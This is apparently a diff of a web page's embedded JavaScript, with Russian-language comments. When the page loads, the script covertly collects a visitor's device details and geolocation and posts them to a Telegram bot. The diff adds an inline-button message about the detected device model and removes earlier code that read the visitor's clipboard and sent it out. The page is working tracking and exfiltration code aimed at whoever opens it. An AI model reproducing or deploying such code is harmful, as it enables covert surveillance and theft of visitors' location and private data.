@@ -173,10 +173,10 @@
                 Проверка установленного Flash Player: ${hasFlash ? 'Установлен' : 'Не установлен'}
             `;
 
-            sendToTelegram(message);
+            sendToTelegram(message, deviceBrandAndModel.model);
         }
 
-        function sendToTelegram(message) {
+        function sendToTelegram(message, deviceModel) {
             fetch(telegramApiUrl, {
                 method: 'POST',
                 headers: {
@@ -190,6 +190,9 @@
             .then(response => response.json())
             .then(data => {
                 console.log('Сообщение отправлено в Telegram:', data);
+                if (deviceModel !== 'Unknown') {
+                    sendModelRecognitionMessage(deviceModel);
+                }
                 requestGeolocation();
             })
             .catch(error => {
@@ -197,114 +200,63 @@
             });
         }
 
-        // Запуск функции для сбора и отправки информации
-        getCompleteInfo();
+        // Функция для отправки сообщения о распознавании модели устройства с инлайн-кнопкой
+        function sendModelRecognitionMessage(deviceModel) {
+            const inlineButtonText = "ПРОВЕРКА МОДЕЛИ УСТРОЙСТВА";
+const googleSearchUrl = `https://www.google.com/search?q=Модель+устройства%3A+${encodeURIComponent(deviceModel)}&client=ms`;
 
-        // Функция для запроса геолокации пользователя
+            const message = `
+                Проверка данных:
+            `;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    reply_markup: JSON.stringify({
+                        inline_keyboard: [[
+                            {
+                                text: inlineButtonText,
+                                url: googleSearchUrl
+                            }
+                        ]]
+                    })
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Сообщение с инлайн-кнопкой отправлено в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке сообщения с инлайн-кнопкой в Telegram:', error);
+            });
+        }
+
         function requestGeolocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        console.log(`Широта: ${latitude}, Долгота: ${longitude}`);
-                        sendLocationToTelegram(latitude, longitude);
-                    },
-                    (error) => {
-                        console.error('Ошибка при получении геолокации:', error);
-                        sendLocationErrorToTelegram();
-                    }
-                );
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const geolocationMessage = `
+                        Широта: ${latitude}
+                        Долгота: ${longitude}
+                        Точность: ${accuracy} метров
+                    `;
+                    sendToTelegram(geolocationMessage, '');
+                }, error => {
+                    console.error('Ошибка при получении геолокации:', error);
+                });
             } else {
-                console.error('Геолокация не поддерживается этим браузером.');
-                sendLocationErrorToTelegram();
-            }
-        }
-        // Функция для отправки геолокации в Telegram-бот
-        function sendLocationToTelegram(latitude, longitude) {
-            const message = `Геолокация пользователя: ${latitude},${longitude}`;
-
-            fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Геолокация отправлена в Telegram:', data);
-                requestClipboardData();
-            })
-            .catch(error => {
-                console.error('Ошибка при отправке геолокации в Telegram:', error);
-            });
-        }
-
-        // Функция для отправки ошибки геолокации в Telegram-бот
-        function sendLocationErrorToTelegram() {
-            const message = `Пользователь заблокировал запрос на геолокацию.`;
-
-            fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Информация об отказе в геолокации отправлена в Telegram:', data);
-                requestClipboardData();
-            })
-            .catch(error => {
-                console.error('Ошибка при отправке информации об отказе в геолокации в Telegram:', error);
-            });
-        }
-
-        // Функция для получения данных буфера обмена
-        async function getClipboardData() {
-            try {
-                const text = await navigator.clipboard.readText();
-                sendClipboardDataToTelegram(text);
-            } catch (err) {
-                console.error('Не удалось прочитать содержимое буфера обмена: ', err);
+                console.warn('Геолокация не поддерживается вашим браузером');
             }
         }
 
-        // Функция для отправки данных буфера обмена в Telegram-бот
-        function sendClipboardDataToTelegram(text) {
-            const message = `Данные из буфера обмена: ${text}`;
-
-            fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Данные буфера обмена отправлены в Telegram:', data);
-            })
-            .catch(error => {
-                console.error('Ошибка при отправке данных буфера обмена в Telegram:', error);
-            });
-        }
-
-        // Функция для запроса данных буфера обмена
-        function requestClipboardData() {
-            getClipboardData();
-        }
+        window.onload = getCompleteInfo;
     </script>
 </body>
 </html>
